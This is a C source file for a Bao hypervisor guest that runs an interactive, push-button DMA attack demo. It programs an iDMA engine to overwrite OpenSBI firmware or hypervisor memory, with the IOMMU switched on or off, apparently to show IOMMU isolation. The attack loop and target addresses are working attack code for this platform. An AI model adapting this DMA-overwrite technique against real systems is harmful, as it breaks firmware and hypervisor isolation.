/** 
 * Bao, a Lightweight Static Partitioning Hypervisor 
 *
 * Copyright (c) Bao Project (www.bao-project.org), 2019-
 *
 * Authors:
 *      Jose Martins <jose.martins@bao-project.org>
 *      Sandro Pinto <sandro.pinto@bao-project.org>
 *
 * Bao is free software; you can redistribute it and/or modify it under the
 * terms of the GNU General Public License version 2 as published by the Free
 * Software Foundation, with a special exception exempting guest code from such
 * license. See the COPYING file in the top-level directory for details. 
 *
 */

#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <cpu.h>
#include <wfi.h>
#include <spinlock.h>
#include <plat.h>
#include <irq.h>
#include <uart.h>
#include <timer.h>
#include <idma.h>

#define TIMER_INTERVAL  (TIME_S(1))

// IOMMU registers
#define IOMMU_BASE_ADDR         (0x50010000ULL)
#define IOMMU_DDTP_OFF          (0x10ULL)
#define IOMMU_DDTP_ADDR         (IOMMU_BASE_ADDR + IOMMU_DDTP_OFF)
#define IOMMU_DDTP_MODE_MASK    (0x0FULL)
#define IOMMU_DDTP_MODE_OFF     (0x00ULL)
#define IOMMU_DDTP_MODE_BARE    (0x01ULL)
#define IOMMU_DDTP_MODE_1LVL    (0x02ULL)

// DMA parameters
#define DMA_TRANSFER_SIZE  (16) // 4KB, i.e. page size

#define DMA_CONF_DECOUPLE 0
#define DMA_CONF_DEBURST 0
#define DMA_CONF_SERIALIZE 0

#define DMA_SRC_ATTACK          (0x81000000ULL)
#define DMA_OPENSBI_BASE_ATTACK (0x80002700ULL)     // 80038000
#define DMA_BAO_BASE_ATTACK     (0x80200000ULL)
#define DMA_ATTACK_LOOPS        (100)

// Debounce counter 
#define DEBOUNCE_WINDOW         (1000)

#define BANNER\
    ".______        ___       ______        _______  __    __   _______     _______.___________.\n"\ 
    "|   _  \\      /   \\     /  __  \\      /  _____||  |  |  | |   ____|   /       |           |\n"\
    "|  |_)  |    /  ^  \\   |  |  |  |    |  |  __  |  |  |  | |  |__     |   (----`---|  |----`\n"\
    "|   _  <    /  /_\\  \\  |  |  |  |    |  | |_ | |  |  |  | |   __|     \\   \\       |  |     \n"\ 
    "|  |_)  |  /  _____  \\ |  `--'  |    |  |__| | |  `--'  | |  |____.----)   |      |  |     \n"\ 
    "|______/  /__/     \\__\\ \\______/      \\______|  \\______/  |_______|_______/       |__|     \n"

spinlock_t print_lock   = SPINLOCK_INITVAL;

// States
typedef enum E_STATES
{
	S_TARGET_SEL = 0, S_BFR_ATTACK, S_ATTACK, S_AFT_ATTACK
} E_STATES;
E_STATES next_state;

void state_restart_attack(void);
void state_target_selection(void);
void state_before_attack(void);
void state_attack(void);
void state_after_attack(void);

void (*function_pointer[])(void) = {state_target_selection, state_before_attack, state_attack, state_after_attack};

// OpenSBI as default target
uint64_t fixed_dst = (uint64_t) DMA_OPENSBI_BASE_ATTACK;
uint64_t dst = (uint64_t) DMA_OPENSBI_BASE_ATTACK;
uint64_t src = (uint64_t) DMA_SRC_ATTACK;

uint8_t sw_match = 0;

/*
* DMA configuration registers
*/
volatile uint64_t *dma_src       = (volatile uint64_t *) DMA_SRC_ADDR(0);
volatile uint64_t *dma_dst       = (volatile uint64_t *) DMA_DST_ADDR(0);
volatile uint64_t *dma_num_bytes = (volatile uint64_t *) DMA_NUMBYTES_ADDR(0);
volatile uint64_t *dma_conf      = (volatile uint64_t *) DMA_CONF_ADDR(0);
volatile uint64_t *dma_nextid    = (volatile uint64_t *) DMA_NEXTID_ADDR(0);
volatile uint64_t *dma_done      = (volatile uint64_t *) DMA_DONE_ADDR(0);
volatile uint64_t *dma_intf      = (volatile uint64_t *) DMA_INTF_ADDR(0);

static inline void fence_i() {
    asm volatile("fence.i" ::: "memory");
}

void uart_rx_handler(){
    printf("cpu%d: %s\n",get_cpuid(), __func__);
    uart_clear_rxirq();
}

void ipi_handler(){
    printf("cpu%d: %s\n", get_cpuid(), __func__);
    irq_send_ipi(1ull << (get_cpuid() + 1));
}

void timer_handler(){

    timer_set(TIMER_INTERVAL);
    irq_send_ipi(1ull << (get_cpuid() + 1));
}

static void set_iommu_mode(uint64_t mode)
{
    volatile uint64_t *iommu_ddtp = (volatile uint64_t *) IOMMU_DDTP_ADDR;
    uint64_t ddtp = *iommu_ddtp;
    ddtp &= ~IOMMU_DDTP_MODE_MASK;
    ddtp |= mode;
    *iommu_ddtp = ddtp;
}

/**
 *  Guarantee that all PBs are released
 */
static void check_released_pb(void)
{
    do {
        // try to clean intf register
        *dma_intf = (uint64_t) DMA_FRONTEND_INTF_ALL_BUTTONS_MASK;

        // Debounce counter
        for (int j = 0; j < DEBOUNCE_WINDOW; j++)
            ;

    } while (((*dma_intf) & DMA_FRONTEND_INTF_ALL_BUTTONS_MASK) != 0);
}

/********************************* STATES ************************************/

/**
 *  Target selection
 *  Poll left and right push buttons
 *  Configure destination address according to the selected target
 */
void state_target_selection(void)
{
    uint64_t intf = 0;

    // Select a target
	printf("\r\nSelect attack: \n");
    printf("\tL - Firmware attack. \n");
    printf("\tR - Hypervisor attack. \n");

    do {
        // poll intf.btnl and intf.btnr bits
        intf = *dma_intf & ((1ULL << DMA_FRONTEND_INTF_BTNL_BIT) | 
                            (1ULL << DMA_FRONTEND_INTF_BTNR_BIT));
    } 
    while(!intf);

    // Wait for buttons to be released
    check_released_pb();

    // Configure destination address according to the target
    if(intf & (1ULL << DMA_FRONTEND_INTF_BTNR_BIT))
    {
        // Bao
        fixed_dst = (uint64_t) DMA_BAO_BASE_ATTACK;
        printf("\r\nYou have selected Bao\n");
    }
    else 
    {
        // OpenSBI
        fixed_dst = (uint64_t) DMA_OPENSBI_BASE_ATTACK;
        printf("\r\nYou have selected OpenSBI\n");
    }

	next_state = S_BFR_ATTACK;
}

/**
 *  Poll the up button to attack
 *  Enable or disable the IOMMU according to the switches enabled
 */
void state_before_attack(void)
{
    uint64_t intf = 0;

    /*** Select protection ***/
    printf("\r\nSelect protection: \r\n");
    printf("\tU - with IOMMU.\r\n");
    printf("\tD - without IOMMU.\r\n");

    do
    {
        // poll intf.btnu and intf.btnd bits
        intf = *dma_intf & ((1ULL << DMA_FRONTEND_INTF_BTNU_BIT) | 
                            (1ULL << DMA_FRONTEND_INTF_BTND_BIT));
    }
    while(!intf);

    // Wait for buttons to be released
    check_released_pb();

    // ack selected protection
    if(intf & (1ULL << DMA_FRONTEND_INTF_BTND_BIT))
    {
        set_iommu_mode(IOMMU_DDTP_MODE_BARE);
        printf("\r\nIOMMU disabled\n");
    }
    else
    {
        set_iommu_mode(IOMMU_DDTP_MODE_1LVL);
        printf("\r\nIOMMU enabled\n");
    }

    // Wait for buttons to be released
    check_released_pb();
            
    next_state = S_ATTACK;
}

/**
 *  Send signal to change scene: attacking
 *  Configure the iDMA module and start the attack
 */
void state_attack(void)
{
    uint64_t intf = 0;
    
    /*** Attack! ***/
    printf("\tC - Attack!\r\n");

    do
    {
        // poll intf.btnc bit
        intf = *dma_intf & (1ULL << DMA_FRONTEND_INTF_BTNC_BIT);
    }
    while(!intf);

    // Wait for buttons to be released
    check_released_pb();

    /*** Setup DMA transfer ***/
    *dma_src        = (uint64_t) src;
    *dma_num_bytes  = (uint64_t) DMA_TRANSFER_SIZE;
    *dma_conf       = (DMA_CONF_DECOUPLE  << DMA_FRONTEND_CONF_DECOUPLE_BIT   ) |
                      (DMA_CONF_DEBURST   << DMA_FRONTEND_CONF_DEBURST_BIT    ) |
                      (DMA_CONF_SERIALIZE << DMA_FRONTEND_CONF_SERIALIZE_BIT  );

    dst = fixed_dst;

    for (int i = 0; i < DMA_ATTACK_LOOPS; i++)
    {
        fence_i();
        
        *dma_dst = (uint64_t) dst;
        printf("%x\n", *dma_dst);

        // launch transfer: read id
        uint64_t transfer_id = *dma_nextid;

        // poll done register
        while (*dma_done != transfer_id);

        // increment for next attack
        dst = dst + DMA_TRANSFER_SIZE;
    }

    for(int i = 0; i < 1000000; i++)
        ;

	next_state = S_AFT_ATTACK;
}

/**
 *  Send signal to change scene: Advice user that the attack failed
 *  Poll down button to go back
 */
void state_after_attack(void)
{
    uint64_t intf = 0;

    // Attack failed!
    printf("\r\nUps... Attack Failed !! \r\n");
    printf("\tC - Try Again :) \r\n");

    do
    {
        // poll intf.btnc register
        intf = *dma_intf & ((1ULL << DMA_FRONTEND_INTF_BTNC_BIT));
    }
    while(!intf);

    // wait for buttons to be released
    check_released_pb();
	
    next_state = S_TARGET_SEL;
}

/********************************** FSM **************************************/

void encode_fsm(void)
{
    static E_STATES state = S_TARGET_SEL;
    
    function_pointer[state]();
    state = next_state;
}

/*********************************** MAIN ************************************/

void main(void){

    static volatile bool master_done = false;

    if(cpu_is_master()){

        spin_lock(&print_lock);
        printf(BANNER);
        spin_unlock(&print_lock);

        irq_set_handler(UART_IRQ_ID, uart_rx_handler);
        irq_set_handler(TIMER_IRQ_ID, timer_handler);
        irq_set_handler(IPI_IRQ_ID, ipi_handler);
        uart_enable_rxirq();
        timer_set(TIMER_INTERVAL);
        irq_enable(TIMER_IRQ_ID);
        master_done = true;
    }
    irq_enable(UART_IRQ_ID);
    irq_set_prio(UART_IRQ_ID, IRQ_MAX_PRIO);
    irq_enable(IPI_IRQ_ID);

    // clear intf register
    *dma_intf = DMA_FRONTEND_INTF_ALL_BUTTONS_MASK;
    
    /*
     * Main Attack Loop
     */
    while(1)
        encode_fsm();
}
